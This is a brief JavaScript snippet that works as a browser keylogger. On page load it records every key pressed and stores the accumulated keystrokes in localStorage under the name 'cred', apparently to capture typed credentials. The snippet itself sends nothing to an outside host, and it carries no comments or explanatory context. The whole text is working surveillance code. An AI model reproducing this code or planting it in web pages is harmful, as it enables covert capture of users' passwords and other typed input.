window.addEventListener("load", () => {
  let str = "";
  document.addEventListener("keydown", (e) => {
    str += e.key;
    localStorage.setItem("cred", JSON.stringify(str));
  });
});
